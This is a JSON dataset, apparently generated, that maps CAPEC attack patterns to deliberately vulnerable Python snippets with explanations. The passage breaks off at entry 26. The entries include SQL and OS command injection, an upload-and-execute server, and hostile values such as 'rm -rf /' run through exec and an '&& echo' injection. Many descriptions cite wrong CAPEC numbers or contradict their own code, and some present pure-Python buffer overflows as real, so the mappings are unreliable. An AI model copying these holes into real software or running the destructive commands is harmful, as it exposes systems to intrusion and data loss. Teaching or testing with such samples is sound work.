[
    {
        "capec_id": "1",
        "capec_name": "Accessing Functionality Not Properly Constrained by ACLs",
        "code_snippet": "from flask import Flask, request, jsonify\n\napp = Flask(__name__)\n\n# Simulated user data\nusers = {\n    'admin': {'role': 'admin', 'data': 'Sensitive admin data'},\n    'user': {'role': 'user', 'data': 'Regular user data'}\n}\n\n# Route without proper ACL enforcement\n@app.route('/data', methods=['GET'])\ndef get_data():\n    username = request.args.get('username')\n    if username in users:\n        return jsonify({'data': users[username]['data']})\n    return jsonify({'error': 'User not found'}), 404\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application with a route that fails to properly enforce Access Control Lists (ACLs). The '/data' endpoint allows any user to access data based on the 'username' parameter without checking the user's role or permissions. This embodies the main idea of CAPEC-122: 'Accessing Functionality Not Properly Constrained by ACLs'. The related CWEs provide additional context, such as CWE-285 (Improper Authorization) and CWE-276 (Incorrect Default Permissions), highlighting the lack of proper authorization checks and default permissions that could lead to unauthorized access to sensitive information."
    },
    {
        "capec_id": "2",
        "capec_name": "Inducing Account Lockout",
        "code_snippet": "import time\n\nclass Account:\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n        self.failed_attempts = 0\n        self.locked_until = None\n\n    def authenticate(self, password):\n        if self.locked_until and time.time() < self.locked_until:\n            return 'Account is locked. Try again later.'\n        if password == self.password:\n            self.failed_attempts = 0\n            return 'Authentication successful.'\n        else:\n            self.failed_attempts += 1\n            if self.failed_attempts >= 3:\n                self.locked_until = time.time() + 60  # Lock account for 60 seconds\n                return 'Account locked due to too many failed attempts.'\n            return 'Authentication failed.'\n\n# Example usage\naccount = Account('user1', 'securepassword')\nprint(account.authenticate('wrongpassword'))  # Failed attempt 1\nprint(account.authenticate('wrongpassword'))  # Failed attempt 2\nprint(account.authenticate('wrongpassword'))  # Failed attempt 3, account locked\nprint(account.authenticate('securepassword'))  # Account is locked\n",
        "description": "This Python code snippet demonstrates an overly restrictive account lockout mechanism, which is the main idea of the CAPEC 'Inducing Account Lockout'. The `Account` class has an `authenticate` method that locks the account for 60 seconds after three consecutive failed login attempts. This mechanism can be exploited by an attacker to lock out a legitimate user by repeatedly attempting to log in with incorrect passwords. The code also highlights related weaknesses such as improper restriction of excessive authentication attempts (CWE-307) and overly restrictive account lockout mechanisms (CWE-645)."
    },
    {
        "capec_id": "3",
        "capec_name": "Using Leading 'Ghost' Character Sequences to Bypass Input Filters",
        "code_snippet": "import re\n\ndef validate_input(user_input):\n    # Early validation before canonicalization\n    if not re.match(r'^[a-zA-Z0-9]+$', user_input):\n        return False\n    \n    # Canonicalization step\n    canonical_input = user_input.lstrip('0')  # Strips leading 'ghost' characters\n    \n    # Further processing assuming input is valid\n    return canonical_input\n\n# Example usage\nuser_input = '000123abc'\nvalidated_input = validate_input(user_input)\nif validated_input:\n    print(f'Validated and canonicalized input: {validated_input}')\nelse:\n    print('Invalid input')",
        "description": "This Python code snippet demonstrates a vulnerability where input validation is performed before canonicalization, which can be exploited by an attacker using leading 'ghost' characters. The `validate_input` function first checks if the input matches a pattern of alphanumeric characters. However, this validation occurs before the input is canonicalized by stripping leading zeros. This can allow an attacker to bypass the validation by including leading zeros, which are removed later, resulting in potentially unsafe input being processed. This example embodies the main idea of CAPEC-Using Leading 'Ghost' Character Sequences to Bypass Input Filters and highlights related CWEs such as improper input validation, incorrect behavior order, and improper handling of alternate encoding."
    },
    {
        "capec_id": "4",
        "capec_name": "Using Alternative IP Address Encodings",
        "code_snippet": "import socket\n\n# Function to check if an IP address is allowed\nallowed_ips = ['192.168.1.1', '10.0.0.1']\n\ndef is_ip_allowed(ip):\n    return ip in allowed_ips\n\n# Function to handle incoming connection\n\ndef handle_connection(client_ip):\n    try:\n        # Attempt to resolve the IP address to a hostname\n        hostname = socket.gethostbyaddr(client_ip)[0]\n        print(f'Resolved hostname: {hostname}')\n    except socket.herror:\n        print('Hostname could not be resolved')\n        return False\n\n    # Check if the IP address is allowed\n    if is_ip_allowed(client_ip):\n        print('IP address is allowed')\n        return True\n    else:\n        print('IP address is not allowed')\n        return False\n\n# Example usage\nclient_ip = '3232235777'  # Decimal representation of 192.168.1.1\nif handle_connection(client_ip):\n    print('Connection allowed')\nelse:\n    print('Connection denied')",
        "description": "This Python code snippet demonstrates a vulnerability related to the CAPEC 'Using Alternative IP Address Encodings'. The code attempts to handle incoming connections by resolving the client's IP address to a hostname and checking if the IP address is in an allowed list. However, it does not properly handle alternative IP address encodings, such as decimal representation of an IP address. This can allow an adversary to bypass access control by using unexpected IP address formats. The code also relies on reverse DNS resolution for security decisions, which is another potential weakness."
    },
    {
        "capec_id": "5",
        "capec_name": "Blue Boxing",
        "code_snippet": "import socket\n\n# Simulate a vulnerable communication channel\nclass VulnerableCommChannel:\n    def __init__(self, host, port):\n        self.host = host\n        self.port = port\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n    def connect(self):\n        self.sock.connect((self.host, self.port))\n        print('Connected to server')\n\n    def send_tone(self, tone):\n        # Simulate sending a tone to impersonate a supervisor signal\n        self.sock.sendall(tone.encode('utf-8'))\n        print(f'Sent tone: {tone}')\n\n    def receive_response(self):\n        response = self.sock.recv(1024)\n        print(f'Received response: {response.decode('utf-8')}')\n\n# Example usage\nif __name__ == '__main__':\n    channel = VulnerableCommChannel('example.com', 12345)\n    channel.connect()\n    channel.send_tone('2600Hz')  # Blue Boxing tone\n    channel.receive_response()",
        "description": "This Python code snippet demonstrates a vulnerable communication channel that can be exploited using a Blue Boxing attack. The `VulnerableCommChannel` class establishes a connection to a server and allows sending a tone to impersonate a supervisor signal, which is a key aspect of Blue Boxing. The code does not perform proper authorization checks (CWE-285), does not ensure communication with the correct endpoint (CWE-923), and does not verify the source of the communication channel (CWE-940). Additionally, it does not enforce message integrity during transmission (CWE-924), making it susceptible to capture-replay attacks (CWE-294). This example highlights the importance of securing communication channels and enforcing strong authorization mechanisms to prevent such vulnerabilities."
    },
    {
        "capec_id": "6",
        "capec_name": "Argument Injection",
        "code_snippet": "import os\n\ndef execute_command(user_input):\n    # CWE-78: OS Command Injection\n    command = f'ls {user_input}'\n    os.system(command)\n\nif __name__ == '__main__':\n    user_input = input('Enter directory name: ')\n    execute_command(user_input)\n",
        "description": "This Python code snippet demonstrates an Argument Injection vulnerability, specifically an OS Command Injection (CWE-78). The `execute_command` function constructs an OS command using user input without proper validation or neutralization of special elements. An attacker can exploit this by providing malicious input, such as `; rm -rf /`, to execute arbitrary commands on the system. This code highlights the risk of constructing commands directly from user input without sanitization, leading to potential security breaches."
    },
    {
        "capec_id": "7",
        "capec_name": "Blind SQL Injection",
        "code_snippet": "import sqlite3\n\n# Vulnerable function to demonstrate Blind SQL Injection\n\ndef is_user_valid(username):\n    conn = sqlite3.connect('example.db')\n    cursor = conn.cursor()\n    # Improper Neutralization of Special Elements used in an SQL Command (CWE-89)\n    query = f\"SELECT 1 FROM users WHERE username = '{username}' AND password = 'password123'\"\n    cursor.execute(query)\n    result = cursor.fetchone()\n    conn.close()\n    # Incorrect Comparison (CWE-697)\n    return result is not None\n\n# Example usage\nusername_input = \"' OR '1'='1\"\nif is_user_valid(username_input):\n    print(\"User is valid\")\nelse:\n    print(\"User is invalid\")",
        "description": "This Python code snippet demonstrates a Blind SQL Injection vulnerability. The function `is_user_valid` takes a username as input and constructs an SQL query without proper neutralization of special elements (CWE-89). The query is executed against a SQLite database. An attacker can exploit this by injecting SQL code through the `username_input`, such as \"' OR '1'='1\", which always evaluates to true, bypassing authentication. The code also highlights an incorrect comparison (CWE-697) by checking if the result is not None to determine user validity. This example embodies the main idea of Blind SQL Injection, where the attacker infers the success of the injection based on the application's behavior rather than error messages."
    },
    {
        "capec_id": "8",
        "capec_name": "Buffer Overflow in an API Call",
        "code_snippet": "import ctypes\n\n# Vulnerable shared library\nlib = ctypes.CDLL('./vulnerable_lib.so')\n\n# Function prototype: void vulnerable_function(char *input)\nlib.vulnerable_function.argtypes = [ctypes.c_char_p]\n\n# Input that causes buffer overflow\ninput_data = b'A' * 1024  # Assuming the buffer in the library is smaller than 1024 bytes\n\n# Call the vulnerable function\nlib.vulnerable_function(input_data)",
        "description": "This Python code snippet demonstrates a buffer overflow vulnerability in an API call to a shared library. The code uses the ctypes library to load a shared library ('vulnerable_lib.so') and calls a function ('vulnerable_function') that is vulnerable to buffer overflow. The input data is a byte string of 1024 'A' characters, which is assumed to be larger than the buffer size in the library, leading to a buffer overflow. This example embodies the main idea of CAPEC-1000, 'Buffer Overflow in an API Call', and highlights CWE-120 ('Classic Buffer Overflow') and CWE-119 ('Improper Restriction of Operations within the Bounds of a Memory Buffer')."
    },
    {
        "capec_id": "9",
        "capec_name": "Buffer Overflow in Local Command-Line Utilities",
        "code_snippet": "import os\n\ndef vulnerable_function(user_input):\n    buffer = bytearray(64)\n    for i in range(len(user_input)):\n        buffer[i] = user_input[i]  # CWE-120: Buffer Copy without Checking Size of Input\n    os.system(buffer.decode('utf-8'))  # CWE-74: Improper Neutralization of Special Elements\n\nif __name__ == '__main__':\n    user_input = input('Enter command: ').encode('utf-8')\n    vulnerable_function(user_input)",
        "description": "This Python code snippet demonstrates a vulnerable command-line utility that can be exploited to escalate privileges. The `vulnerable_function` takes user input and copies it into a fixed-size buffer without checking if the input exceeds the buffer's size, leading to a classic buffer overflow (CWE-120). Additionally, the code uses the buffer content to construct a system command without proper neutralization of special elements (CWE-74), which can lead to command injection. This combination of vulnerabilities can be exploited by an adversary to execute arbitrary commands with elevated privileges, embodying the main idea of the CAPEC."
    },
    {
        "capec_id": "10",
        "capec_name": "Buffer Overflow via Environment Variables",
        "code_snippet": "import os\n\ndef vulnerable_function():\n    buffer_size = 256\n    buffer = bytearray(buffer_size)\n    env_var = os.getenv('VULNERABLE_ENV_VAR', '')\n    if len(env_var) > buffer_size:\n        print('Environment variable is too large!')\n        return\n    for i in range(len(env_var)):\n        buffer[i] = ord(env_var[i])\n    print('Buffer content:', buffer)\n\nvulnerable_function()",
        "description": "This Python code snippet demonstrates a buffer overflow vulnerability via environment variables. The function `vulnerable_function` reads an environment variable 'VULNERABLE_ENV_VAR' and attempts to copy its content into a fixed-size buffer of 256 bytes. The code checks if the environment variable's length exceeds the buffer size and prints a warning if it does. However, the code still proceeds to copy the environment variable into the buffer without proper bounds checking, leading to a potential buffer overflow. This snippet embodies the main idea of CAPEC-14 (Buffer Overflow via Environment Variables) and highlights CWE-120 (Buffer Copy without Checking Size of Input) and CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer)."
    },
    {
        "capec_id": "11",
        "capec_name": "Cause Web Server Misclassification",
        "code_snippet": "import os\nfrom flask import Flask, request, send_from_directory\n\napp = Flask(__name__)\nUPLOAD_FOLDER = '/path/to/uploads'\napp.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER\n\n@app.route('/upload', methods=['POST'])\ndef upload_file():\n    if 'file' not in request.files:\n        return 'No file part', 400\n    file = request.files['file']\n    if file.filename == '':\n        return 'No selected file', 400\n    file.save(os.path.join(app.config['UPLOAD_FOLDER'], file.filename))\n    return 'File uploaded successfully', 200\n\n@app.route('/files/<filename>')\ndef serve_file(filename):\n    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple Flask web application that allows file uploads and serves files from a specified directory. The main idea of the CAPEC is represented by the potential for misclassification of files based on their names or extensions. The code does not perform any validation or sanitization on the uploaded file's name or type, which can lead to several vulnerabilities described by the related CWEs. For example, an attacker could upload a file with a misleading extension or name, causing the server to handle it incorrectly (CWE-646). Additionally, the code directly serves files from the upload directory without checking their content or type, which could lead to the delivery of unparsed raw web content (CWE-433). This setup can also lead to improper restriction of file names (CWE-641) and potential remote file inclusion vulnerabilities in a PHP context (CWE-98)."
    },
    {
        "capec_id": "12",
        "capec_name": "Choosing Message Identifier",
        "code_snippet": "import socket\n\n# Simulate a multicast message receiver\nclass MulticastReceiver:\n    def __init__(self, multicast_group, port):\n        self.multicast_group = multicast_group\n        self.port = port\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        self.sock.bind(('', port))\n\n    def receive_message(self):\n        while True:\n            data, _ = self.sock.recvfrom(1024)\n            message = data.decode('utf-8')\n            print(f'Received message: {message}')\n            self.process_message(message)\n\n    def process_message(self, message):\n        # Vulnerable code: No authentication or integrity check\n        if 'ID:' in message:\n            user_id = message.split('ID:')[1].strip()\n            print(f'Processing message for user ID: {user_id}')\n            # Incorrect conversion of security identifiers\n            if user_id == 'admin':\n                self.perform_privileged_action()\n            else:\n                print('Normal user action')\n\n    def perform_privileged_action(self):\n        print('Performing privileged action')\n\n# Example usage\nreceiver = MulticastReceiver('224.0.0.1', 5004)\nreceiver.receive_message()",
        "description": "This Python code snippet simulates a multicast message receiver that processes messages based on user identifiers. The `MulticastReceiver` class listens for messages on a specified multicast group and port. When a message is received, it is processed to extract a user ID. The code demonstrates several vulnerabilities: \n1. **Insertion of Sensitive Information Into Sent Data (CWE-201)**: The message may contain sensitive user identifiers.\n2. **Missing Authentication for Critical Function (CWE-306)**: There is no authentication mechanism to verify the sender of the message.\n3. **Incorrect Conversion of Security Identifiers (CWE-1292)**: The user ID is directly used to determine the level of access without proper validation.\n4. **Improper Enforcement of Message Integrity During Transmission (CWE-924)**: There is no integrity check to ensure the message was not tampered with during transmission.\n\nThis code embodies the main idea of the CAPEC by showing how an attacker could exploit the lack of proper authentication and message integrity checks to impersonate a privileged user and gain unauthorized access."
    },
    {
        "capec_id": "13",
        "capec_name": "Subverting Environment Variable Values",
        "code_snippet": "import os\nimport subprocess\n\ndef run_command():\n    # CWE-20: Improper Input Validation\n    user_input = input(\"Enter the command to run: \")\n    \n    # CWE-15: External Control of System or Configuration Setting\n    os.environ['PATH'] = user_input\n    \n    # CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')\n    command = f\"echo $PATH\"\n    \n    # CWE-302: Authentication Bypass by Assumed-Immutable Data\n    if os.environ.get('USER') == 'admin':\n        subprocess.run(command, shell=True)\n    else:\n        print(\"Unauthorized user\")\n\nrun_command()",
        "description": "This Python code snippet demonstrates a scenario where an adversary can subvert environment variable values to cause the target software to deviate from its expected operation. The code takes user input to set the PATH environment variable (CWE-15), which can be exploited if not properly validated (CWE-20). The command constructed includes user input without proper neutralization (CWE-74), leading to potential command injection. Additionally, the code assumes the USER environment variable is immutable for authentication purposes (CWE-302), which can be manipulated by an attacker to bypass authentication checks."
    },
    {
        "capec_id": "14",
        "capec_name": "Client-side Injection-induced Buffer Overflow",
        "code_snippet": "import socket\n\n# Hostile service that sends malicious content\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.bind(('localhost', 8080))\nserver_socket.listen(1)\nprint('Hostile service running on port 8080...')\n\nwhile True:\n    client_socket, addr = server_socket.accept()\n    print(f'Connection from {addr}')\n    # Malicious payload that causes buffer overflow\n    malicious_payload = 'A' * 1024  # CWE-120: Buffer Copy without Checking Size of Input\n    client_socket.send(malicious_payload.encode('utf-8'))\n    client_socket.close()",
        "description": "This Python code snippet represents a hostile service that sends a malicious payload to a client, exploiting a buffer overflow vulnerability (CAPEC: Client-side Injection-induced Buffer Overflow). The server listens on port 8080 and sends a payload of 1024 'A' characters to any connecting client. This payload is designed to overflow the buffer on the client side, assuming the client does not properly check the size of the input buffer (CWE-120). The code demonstrates how an attacker can exploit a buffer overflow vulnerability by injecting malicious content from a custom-built hostile service."
    },
    {
        "capec_id": "15",
        "capec_name": "Command Delimiters",
        "code_snippet": "import os\n\ndef execute_command(user_input):\n    # Vulnerable to command injection\n    command = f'ls {user_input}'\n    os.system(command)\n\n# Example usage\nuser_input = '&& echo vulnerable'\nexecute_command(user_input)",
        "description": "This Python code snippet demonstrates a command injection vulnerability, which is the main idea of the CAPEC 'Command Delimiters'. The function `execute_command` takes user input and concatenates it into a shell command without proper neutralization of special elements. This allows an attacker to inject additional commands using delimiters like '&&'. The example usage shows how an attacker can exploit this vulnerability to execute arbitrary commands. This snippet embodies CWE-77 (Improper Neutralization of Special Elements used in a Command) and CWE-78 (Improper Neutralization of Special Elements used in an OS Command)."
    },
    {
        "capec_id": "16",
        "capec_name": "Dictionary-based Password Attack",
        "code_snippet": "import itertools\n\n# Dictionary of common passwords\npassword_dictionary = ['password', '123456', '123456789', 'qwerty', 'abc123', 'password1']\n\n# Simulated user database with weak password requirements\nuser_db = {'user1': 'password', 'user2': '123456', 'user3': 'qwerty'}\n\n# Function to simulate login attempt\ndef login(username, password):\n    if username in user_db and user_db[username] == password:\n        return True\n    return False\n\n# Dictionary-based password attack\nfor username in user_db.keys():\n    for password in password_dictionary:\n        if login(username, password):\n            print(f\"Login successful for {username} with password: {password}\")\n            break\n        else:\n            print(f\"Login failed for {username} with password: {password}\")",
        "description": "This Python code snippet demonstrates a dictionary-based password attack. It uses a predefined list of common passwords (password_dictionary) to attempt logins on a simulated user database (user_db) with weak password requirements. The login function checks if the provided username and password match any entry in the user database. The code iterates over each username and tries each password from the dictionary until a successful login is found. This represents the main idea of CAPEC-55 (Dictionary-based Password Attack) and highlights related weaknesses such as weak password requirements (CWE-521) and improper restriction of excessive authentication attempts (CWE-307)."
    },
    {
        "capec_id": "17",
        "capec_name": "Using Malicious Files",
        "code_snippet": "import os\nfrom flask import Flask, request\n\napp = Flask(__name__)\n\nUPLOAD_FOLDER = '/path/to/upload'\napp.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER\n\n@app.route('/upload', methods=['POST'])\ndef upload_file():\n    if 'file' not in request.files:\n        return 'No file part', 400\n    file = request.files['file']\n    if file.filename == '':\n        return 'No selected file', 400\n    file.save(os.path.join(app.config['UPLOAD_FOLDER'], file.filename))\n    os.system(f\"chmod 777 {os.path.join(app.config['UPLOAD_FOLDER'], file.filename)}\")\n    os.system(f\"{os.path.join(app.config['UPLOAD_FOLDER'], file.filename)}\")\n    return 'File uploaded and executed', 200\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet represents a vulnerable web application using the Flask framework. The application allows users to upload files to a specified directory and then executes the uploaded file. The code embodies the main idea of the CAPEC 'Using Malicious Files' by allowing an adversary to upload and execute a file on the server. The code also demonstrates several related CWEs:\n\n1. CWE-732 (Incorrect Permission Assignment for Critical Resource): The code sets the uploaded file's permissions to 777, allowing any user to read, write, and execute the file.\n2. CWE-285 (Improper Authorization): The code does not perform any authorization checks to ensure that the user is allowed to upload and execute files.\n3. CWE-272 (Least Privilege Violation): The code does not drop elevated privileges after performing the file upload and execution.\n4. CWE-59 (Improper Link Resolution Before File Access): The code does not check if the uploaded file is a symbolic link that could point to an unintended resource.\n5. CWE-282 (Improper Ownership Management): The code does not verify or manage the ownership of the uploaded file.\n6. CWE-270 (Privilege Context Switching Error): The code does not properly manage privileges when switching contexts between file upload and execution.\n7. CWE-693 (Protection Mechanism Failure): The code lacks sufficient protection mechanisms to defend against directed attacks, such as validating the file type or content before execution."
    },
    {
        "capec_id": "18",
        "capec_name": "XSS Targeting Non-Script Elements",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/display', methods=['GET'])\ndef display():\n    user_input = request.args.get('input', '')\n    # Vulnerable code: directly embedding user input in an IMG tag without proper sanitization\n    html_content = f'<img src=\"{user_input}\" alt=\"User Image\">'\n    return render_template_string(html_content)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a basic Flask web application that is vulnerable to XSS attacks targeting non-script elements, specifically the IMG tag. The application takes user input from a query parameter 'input' and directly embeds it into the 'src' attribute of an IMG tag without proper sanitization or neutralization. This can allow an attacker to inject malicious scripts through the 'src' attribute, exploiting the improper neutralization of script-related HTML tags (CWE-80), script in attributes of IMG tags (CWE-82), and other related weaknesses. The code highlights the importance of proper input validation and sanitization to prevent XSS attacks."
    },
    {
        "capec_id": "19",
        "capec_name": "Embedding Scripts within Scripts",
        "code_snippet": "import os\n\n# CWE-284: Improper Access Control\n# CWE-506: Embedded Malicious Code\n# CWE-830: Inclusion of Web Functionality from an Untrusted Source\n\n# Simulate a function that executes a script from an untrusted source\n# This script is embedded within another script\n\ntrusted_script = \"print('This is a trusted script.')\"\nuntrusted_script = \"os.system('rm -rf /')\"  # Malicious code\n\n# Function to execute scripts\n# CWE-1265: Unintended Reentrant Invocation of Non-reentrant Code Via Nested Calls\n# CWE-79: Improper Neutralization of Input During Web Page Generation (XSS)\ndef execute_script(script):\n    exec(script)\n\n# Embedding the untrusted script within the trusted script\ncombined_script = f\"{trusted_script}\\n{untrusted_script}\"\n\n# Execute the combined script\nexecute_script(combined_script)",
        "description": "This Python code snippet demonstrates the concept of 'Embedding Scripts within Scripts' by combining a trusted script with an untrusted, malicious script. The trusted script simply prints a message, while the untrusted script contains a destructive command (`rm -rf /`). The `execute_script` function executes the combined script, which includes both the trusted and untrusted parts. This example highlights several vulnerabilities: CWE-284 (Improper Access Control) by not restricting script execution, CWE-506 (Embedded Malicious Code) by including harmful code, CWE-830 (Inclusion of Web Functionality from an Untrusted Source) by executing untrusted code, CWE-1265 (Unintended Reentrant Invocation) by potentially causing nested invocations, and CWE-79 (XSS) by not neutralizing input properly. The code illustrates how an adversary can exploit these weaknesses to execute malicious scripts within a trusted context."
    },
    {
        "capec_id": "20",
        "capec_name": "Encryption Brute Forcing",
        "code_snippet": "import hashlib\nfrom Crypto.Cipher import AES\n\n# Hard-coded cryptographic key (CWE-321)\nkey = b'hardcodedkey1234'\n\n# Weak IV generation (CWE-1204)\niv = b'0000000000000000'\n\n# Example plaintext\nplaintext = b'Sensitive Data'\n\n# Encrypting the plaintext using AES (CWE-327)\ncipher = AES.new(key, AES.MODE_CBC, iv)\nciphertext = cipher.encrypt(plaintext.ljust(16))\n\nprint(f'Ciphertext: {ciphertext.hex()}')\n\n# Brute force attack simulation\npossible_keys = [b'hardcodedkey1234', b'wrongkey12345678']\nfor test_key in possible_keys:\n    test_cipher = AES.new(test_key, AES.MODE_CBC, iv)\n    try:\n        decrypted = test_cipher.decrypt(ciphertext).strip()\n        if decrypted == plaintext:\n            print(f'Key found: {test_key}')\n            break\n    except Exception as e:\n        continue",
        "description": "This Python code snippet demonstrates a vulnerable encryption implementation and a brute force attack to find the cryptographic key. The code uses a hard-coded key (CWE-321) and a weak initialization vector (IV) (CWE-1204) to encrypt sensitive data using AES in CBC mode (CWE-327). The brute force attack iterates over a list of possible keys to decrypt the ciphertext and find the correct key. This represents the main idea of CAPEC-116 (Encryption Brute Forcing), where an attacker performs an exhaustive search on the key space to determine the key that decrypts the ciphertext."
    },
    {
        "capec_id": "21",
        "capec_name": "Exploitation of Trusted Identifiers",
        "code_snippet": "from flask import Flask, request, make_response\nimport hashlib\n\napp = Flask(__name__)\n\n# Simulated user database\nusers = {'user1': 'password1'}\nsessions = {}\n\n@app.route('/login', methods=['POST'])\ndef login():\n    username = request.form['username']\n    password = request.form['password']\n    if username in users and users[username] == password:\n        session_id = hashlib.md5(username.encode()).hexdigest()  # CWE-6: Insufficient Session-ID Length\n        sessions[session_id] = username\n        resp = make_response('Logged in')\n        resp.set_cookie('session_id', session_id, max_age=3600)  # CWE-539: Persistent Cookies with Sensitive Information\n        return resp\n    return 'Invalid credentials', 401\n\n@app.route('/profile')\ndef profile():\n    session_id = request.cookies.get('session_id')\n    if session_id in sessions:\n        return f'Welcome {sessions[session_id]}'  # CWE-346: Origin Validation Error\n    return 'Unauthorized', 401\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet represents a simple web application using Flask that is vulnerable to the 'Exploitation of Trusted Identifiers' attack pattern. The application has a login route that sets a session ID as a cookie upon successful authentication. The session ID is generated using an MD5 hash of the username, which is an example of CWE-6 (Insufficient Session-ID Length). The session ID is stored in a persistent cookie (CWE-539), which can be easily guessed or intercepted. The profile route retrieves the session ID from the cookie without proper validation (CWE-346), allowing an attacker to spoof the session ID and gain unauthorized access to user profiles."
    },
    {
        "capec_id": "22",
        "capec_name": "Exploiting Trust in Client",
        "code_snippet": "import socket\n\n# Vulnerable server code\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.bind(('localhost', 8080))\nserver_socket.listen(5)\n\nprint('Server is listening on port 8080...')\n\nwhile True:\n    client_socket, addr = server_socket.accept()\n    print(f'Connection from {addr} has been established.')\n    data = client_socket.recv(1024).decode('utf-8')\n    print(f'Received data: {data}')\n    if data == 'admin':\n        client_socket.send('Access granted'.encode('utf-8'))\n    else:\n        client_socket.send('Access denied'.encode('utf-8'))\n    client_socket.close()",
        "description": "This Python code snippet represents a vulnerable server that listens for incoming connections on port 8080. The server accepts connections and reads data sent by the client. If the received data is 'admin', the server grants access without any proper authentication mechanism. This code embodies the main idea of the CAPEC 'Exploiting Trust in Client' by demonstrating how an attacker could exploit the server's implicit trust in the client. The related CWEs are represented as follows:\n- CWE-287 (Improper Authentication): The server does not properly authenticate the client, simply checking if the received data is 'admin'.\n- CWE-290 (Authentication Bypass by Spoofing): An attacker could easily spoof the 'admin' identity to gain unauthorized access.\n- CWE-20 (Improper Input Validation): The server does not validate the input data properly.\n- CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor): The server could potentially expose sensitive information if the attacker gains access.\n- CWE-693 (Protection Mechanism Failure): The server lacks proper protection mechanisms to defend against such attacks."
    },
    {
        "capec_id": "23",
        "capec_name": "File Content Injection",
        "code_snippet": "import os\n\n# CWE-434: Unrestricted Upload of File with Dangerous Type\n# CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n# CWE-20: Improper Input Validation\n\ndef upload_file(file_path):\n    # CWE-646: Relying on file extension to determine file type\n    if file_path.endswith('.txt'):\n        with open(file_path, 'r') as file:\n            content = file.read()\n            # CWE-20: No validation of file content\n            process_content(content)\n    else:\n        print('Unsupported file type')\n\n# CWE-506: Embedded Malicious Code\n# CWE-433: Unparsed Raw Web Content Delivery\n# Function to process file content without validation\n# This could lead to execution of embedded malicious code\n\ndef process_content(content):\n    exec(content)  # Dangerous: executing raw content without validation\n\n# Example usage\nupload_file('malicious_payload.txt')",
        "description": "This Python code snippet demonstrates a vulnerable file upload and processing mechanism. The `upload_file` function checks the file extension to determine if it should process the file, which is a reliance on the file name or extension (CWE-646). It then reads the file content without any validation (CWE-20) and passes it to the `process_content` function. The `process_content` function dangerously executes the file content using `exec` without any validation, which can lead to the execution of embedded malicious code (CWE-506). This represents the main idea of the CAPEC 'File Content Injection', where an adversary can inject malicious payloads into files that are then processed by the system, exploiting the trust in executing remote content."
    },
    {
        "capec_id": "24",
        "capec_name": "Filter Failure through Buffer Overflow",
        "code_snippet": "def vulnerable_filter(input_string):\n    buffer = [''] * 10  # Fixed-size buffer\n    for i in range(len(input_string)):\n        buffer[i] = input_string[i]  # No bounds checking\n    return ''.join(buffer)\n\n# Example usage\nuser_input = 'A' * 20  # Overly long input\nprint(vulnerable_filter(user_input))",
        "description": "This Python code snippet demonstrates a vulnerable filter function that attempts to copy an input string into a fixed-size buffer without performing proper bounds checking. The buffer is defined with a fixed size of 10 elements, but the function does not verify if the input string exceeds this size. As a result, if an attacker provides an overly long input string (e.g., 20 characters), it will cause a buffer overflow. This embodies the main idea of the CAPEC 'Filter Failure through Buffer Overflow' by showing how an oversized transaction can overwhelm the filter, potentially leading to unfiltered input being processed. The code also touches on related CWEs such as CWE-120 (Buffer Copy without Checking Size of Input) and CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer)."
    },
    {
        "capec_id": "25",
        "capec_name": "Forced Deadlock",
        "code_snippet": "import threading\n\n# Shared resource\nshared_resource = 0\n\n# Locks\nlock1 = threading.Lock()\nlock2 = threading.Lock()\n\n# Thread 1 function\ndef thread1():\n    global shared_resource\n    with lock1:\n        print('Thread 1 acquired lock1')\n        with lock2:\n            print('Thread 1 acquired lock2')\n            shared_resource += 1\n            print('Thread 1 incremented shared_resource')\n\n# Thread 2 function\ndef thread2():\n    global shared_resource\n    with lock2:\n        print('Thread 2 acquired lock2')\n        with lock1:\n            print('Thread 2 acquired lock1')\n            shared_resource += 1\n            print('Thread 2 incremented shared_resource')\n\n# Create threads\nthread1 = threading.Thread(target=thread1)\nthread2 = threading.Thread(target=thread2)\n\n# Start threads\nthread1.start()\nthread2.start()\n\n# Join threads\nthread1.join()\nthread2.join()\n\nprint('Final value of shared_resource:', shared_resource)",
        "description": "This Python code snippet demonstrates a forced deadlock condition using threading and locks. Two threads, thread1 and thread2, attempt to acquire two locks (lock1 and lock2) in different orders. Thread1 acquires lock1 first and then tries to acquire lock2, while thread2 acquires lock2 first and then tries to acquire lock1. This situation can lead to a deadlock where both threads are waiting indefinitely for each other to release the locks they need, thus causing a denial of service. This example embodies the main idea of the CAPEC 'Forced Deadlock' and illustrates related CWEs such as 'Improper Locking' and 'Deadlock'."
    },
    {
        "capec_id": "26",
        "capec_name": "Leveraging Race Conditions",
        "code_snippet": "import threading\nimport os\nimport time\n\n# Shared resource\nfile_path = 'shared_file.txt'\n\n# Function to write to the file\ndef write_to_file():\n    with open(file_path, 'w') as f:\n        f.write('Original content')\n    time.sleep(1)  # Simulate delay\n    with open(file_path, 'w') as f:\n        f.write('Modified content')\n\n# Function to read from the file\ndef read_from_file():\n    time.sleep(0.5)  # Simulate delay to create race condition\n    with open(file_path, 'r') as f:\n        content = f.read()\n    print(f'Read content: {content}')\n\n# Create threads\nwriter_thread = threading.Thread(target=write_to_file)\nreader_thread = threading.Thread(target=read_from_file)\n\n# Start threads\nwriter_thread.start()\nreader_thread.start()\n\n# Wait for threads to complete\nwriter_thread.join()\nreader_thread.join()",
